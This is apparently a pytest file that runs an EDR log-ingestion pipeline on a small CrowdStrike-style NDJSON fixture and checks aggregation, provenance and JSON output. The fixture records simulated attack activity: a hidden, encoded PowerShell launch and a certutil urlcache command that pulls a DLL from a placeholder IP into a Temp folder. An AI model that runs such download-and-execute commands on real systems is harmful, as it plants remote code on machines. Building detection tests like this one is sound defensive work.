"""Lane-A · Preview flag-ON NDJSON EDR wire-shape validation.

Executes the FULL Lane-A pipeline with ``IUE_STRUCTURED_LANE=on`` on a
realistic (but small) CrowdStrike-Falcon-shape NDJSON fixture and
proves the wire contract that the future frontend will consume:

    LogicalEvent objects · report_extraction fragment · provenance
    chain · tenant isolation · record-boundary preservation.

The wire output is written to ``/app/backend/tests/canonical/iue/lane_a/
preview_wire_output.json`` for owner inspection.  This is diagnostic,
not a golden — it is regenerated on every run.
"""
from __future__ import annotations

import json
import sys
from pathlib import Path

_HERE = Path(__file__).resolve()
_BACKEND = _HERE.parents[4]
if str(_BACKEND) not in sys.path:
    sys.path.insert(0, str(_BACKEND))

_WIRE_OUT = _HERE.parent / "preview_wire_output.json"


# ── Fixture · realistic CrowdStrike-Falcon NDJSON export ──────────
_FIXTURE_NDJSON = b'''\
{"event_time":"2026-02-14T12:00:00.010Z","host":"srv-01","user":"jsmith","action":"exec","category":"process","CommandLine":"powershell -nop -w hidden -enc SGVsbG8=","src_ip":"10.0.0.1","dst_ip":"185.220.101.7","sha256":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}
{"event_time":"2026-02-14T12:00:00.240Z","host":"srv-01","user":"jsmith","action":"exec","category":"process","CommandLine":"powershell -nop -w hidden -enc SGVsbG8=","src_ip":"10.0.0.1","dst_ip":"185.220.101.7","sha256":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}
{"event_time":"2026-02-14T12:00:00.870Z","host":"srv-01","user":"jsmith","action":"exec","category":"process","CommandLine":"powershell -nop -w hidden -enc SGVsbG8=","src_ip":"10.0.0.1","dst_ip":"185.220.101.7","sha256":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}
{"event_time":"2026-02-14T12:00:05.100Z","host":"srv-01","user":"jsmith","action":"file_write","category":"file","CommandLine":"certutil.exe -f urlcache http://198.51.100.20/x.dll","src_ip":"10.0.0.1","dst_ip":"198.51.100.20","file_path":"C:\\\\Windows\\\\Temp\\\\x.dll","sha256":"a" }
{"event_time":"2026-02-14T12:00:07.500Z","host":"srv-02","user":"rjones","action":"network_connect","category":"network","src_ip":"10.0.0.2","dst_ip":"198.51.100.20","dst_port":"443"}
{"event_time":"2026-02-14T12:00:08.220Z","host":"srv-02","user":"rjones","action":"network_connect","category":"network","src_ip":"10.0.0.2","dst_ip":"198.51.100.20","dst_port":"443"}
{"malformed json line, missing quotes and braces}
{"event_time":"2026-02-14T12:00:15.000Z","host":"srv-03","user":"admin","action":"login_success","category":"identity","src_ip":"203.0.113.99","username":"admin"}
'''


def test_preview_wire_shape_ndjson_edr_fixture(monkeypatch):
    monkeypatch.setenv("IUE_STRUCTURED_LANE", "on")

    from services.iue.intake import intake
    from services.iue.collectors.log_collector import collect
    from services.iue.parsers.ndjson_parser import iter_records
    from services.iue.normalizers.field_map import normalize
    from services.iue.aggregator import aggregate
    from services.iue.understanding import understand_structured

    # 1. Intake
    d = intake(_FIXTURE_NDJSON, allow_prev_fallback=True)
    assert d.lane == "structured"
    assert d.kind in {"raw_json", "ndjson"}
    assert d.tenant_id  # non-empty

    # 2. Collect
    raw = collect(_FIXTURE_NDJSON, mime="application/x-ndjson",
                    input_id=d.input_id, tenant_id=d.tenant_id,
                    upstream=d.provenance)
    assert raw.source_file_id

    # 3. Parse
    parsed = list(iter_records(raw))
    # 8 lines total; 7 well-formed + 1 malformed (line 7)
    assert len(parsed) == 8
    ok_records = [p for p in parsed if p.parse_status == "ok"]
    bad_records = [p for p in parsed if p.parse_status == "malformed"]
    assert len(ok_records) == 7
    assert len(bad_records) == 1

    # 4. Normalize
    normalized = [normalize(p) for p in ok_records]
    # Every well-formed record must map at least source.ip + command_line
    # (except the last one which is an identity event).
    exec_records = [n for n in normalized
                     if n.canonical_fields.get("canonical.event.action") == "exec"]
    assert len(exec_records) == 3
    assert all("canonical.process.command_line" in n.canonical_fields
                for n in exec_records)

    # 5. Aggregate
    events = aggregate(normalized)
    # Expected outcome:
    #   - 3 exec records → collapse into 1 LogicalEvent (count=3)
    #     (same tenant/action/src_ip/dst_ip/command_line/sha256; 1s bucket
    #      covers 12:00:00.010 through 12:00:00.870)
    #   - 1 file_write record → 1 LogicalEvent (count=1)
    #   - 2 network_connect records at 12:00:07 and 12:00:08 → 2 separate
    #     LogicalEvents (different 1s buckets)
    #   - 1 login_success → 1 LogicalEvent
    # Total: 5 LogicalEvents
    assert len(events) == 5, (
        f"Wire-shape regression — expected 5 LogicalEvents from the "
        f"fixture, got {len(events)}: "
        f"{[(ev.canonical_fields.get('canonical.event.action'), ev.count) for ev in events]}"
    )

    biggest = max(events, key=lambda e: e.count)
    assert biggest.count == 3
    assert len(biggest.record_refs) == 3
    assert biggest.canonical_fields.get("canonical.event.action") == "exec"

    # 6. Understand → additive report_extraction fragment
    fragment = understand_structured(events)
    assert fragment["logical_event_count"] == 5
    assert fragment["logical_record_total"] == 7  # 7 well-formed collapsed

    # 7. Provenance chain walkable
    for ev in events:
        chain = ev.provenance.upstream_evidence_ids
        # Aggregator's upstream is a NormalizedRecord; normalize's upstream
        # is a ParsedRecord; parse's upstream is a RawPayload; collect's
        # upstream is IntakeDecision.  The chain must reference at least
        # normalize + parse tags.
        engines = [s for s in chain if isinstance(s, str)]
        assert any("iue.normalizers.field_map" in e for e in engines)
        assert any("iue.parsers.ndjson" in e for e in engines)

    # 8. Wire-serialisable — anything the frontend consumes MUST survive
    # json.dumps without a default= handler.
    wire = {
        "intake_decision": d.to_dict(),
        "raw_payload":     raw.to_dict(),
        "logical_events":  [ev.to_dict() for ev in events],
        "malformed":       [p.to_dict() for p in bad_records],
        "report_extraction_fragment": fragment,
    }
    text = json.dumps(wire, indent=2, sort_keys=True, default=str)
    _WIRE_OUT.write_text(text + "\n", encoding="utf-8")

    # Post-condition: the file was written for owner inspection.
    assert _WIRE_OUT.exists()
    assert _WIRE_OUT.stat().st_size > 1_000
